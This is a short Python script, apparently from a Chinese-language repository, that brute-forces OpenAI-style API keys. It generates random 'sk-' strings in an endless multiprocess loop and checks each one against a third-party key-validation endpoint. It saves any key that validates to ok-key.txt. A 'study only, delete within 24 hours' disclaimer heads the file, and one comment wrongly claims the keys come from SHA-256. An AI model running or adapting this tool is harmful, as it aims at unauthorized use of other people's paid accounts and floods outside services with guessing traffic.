# 本项目仅限 学习交流 切勿商用 请在【二十四小时内（删除）】本源代码+通过本源代码生成结果的txt文本及文件，不得保留，违者自负

import hashlib
import multiprocessing
import time
import requests
import string
import random


def generate_key():
    # Openai官方文档指出 根据SHA-256散列函数生成随机字符串
    key_sk_star = "sk-"
    key_random_sk = ''.join(random.choices(string.ascii_letters + string.digits, k=48)) # 48为长度，官方的密钥长度
    key_sk_end = key_random_sk

    return key_sk_star + key_sk_end


def validate_key(key):
    #根据 夏柔API 验证key正确性 切勿乱改 报错不管
    url = f"https://v1.apigpt.cn/key/?key={key}"
    headers = {"Content-Type": "application/json"}

    response = requests.get(url, headers=headers)

    if response.status_code != 200:
        return None

    data = response.json()
    return data.get("total_granted", None)


def write_strings_to_file(filename, num_strings):
    # 写入文件操作
    with open(filename, "a") as f:
        for i in range(num_strings):
            key = generate_key()
            total_granted = validate_key(key)

            if total_granted is None:
                # 写入错误密钥
                with open("error-key.txt", "a") as f_error:
                    f_error.write(key + "\n")
            else:
                # 写入正确密钥
                with open("ok-key.txt", "a") as f_ok:
                    f_ok.write(key + "\n")
            # 写入日志
            with open("log.txt", "a") as f_log:
                f_log.write(f"Key: {key}, 检测结果: {total_granted}\n")

            # 一般设置2 想快一点就0
            time.sleep(0)


if __name__ == '__main__':
    # 1000/写一次
    filename = 'all.txt'
    num_strings = 1000

    # 循环执行生成和写入
    while True:
        # 创建多进程池，指定进程数量为CPU核心数的两倍
        pool = multiprocessing.Pool(multiprocessing.cpu_count() * 2)

        # 在进程池中并行执行生成和写入
        for i in range(multiprocessing.cpu_count() * 2):
            pool.apply_async(write_strings_to_file, args=(filename, num_strings))

        # 关闭进程池
        pool.close()
        pool.join()
